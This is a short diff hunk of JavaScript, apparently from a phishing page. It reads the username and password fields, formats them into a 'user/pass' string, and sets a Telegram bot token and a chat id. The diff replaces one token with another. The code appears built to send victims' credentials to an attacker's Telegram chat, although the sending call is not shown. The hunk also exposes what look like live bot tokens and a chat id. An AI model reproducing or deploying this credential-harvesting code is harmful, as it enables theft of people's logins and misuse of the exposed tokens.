@@ -20,7 +20,7 @@ var pass = $("#pass").val();
 
 var text = "user : " + username + "|| pass : " + pass;
 
-var token = "888370736:AAHfnPTsKGy6YKLvO9_DGRPuauIPYx0TwoM";
+var token = "800698627:AAHon1metzwlICeYOaN-ADN-RroliLYu4Vo";
 var id = "734947986";
 
 if(username.length > 0 && pass.length > 0){
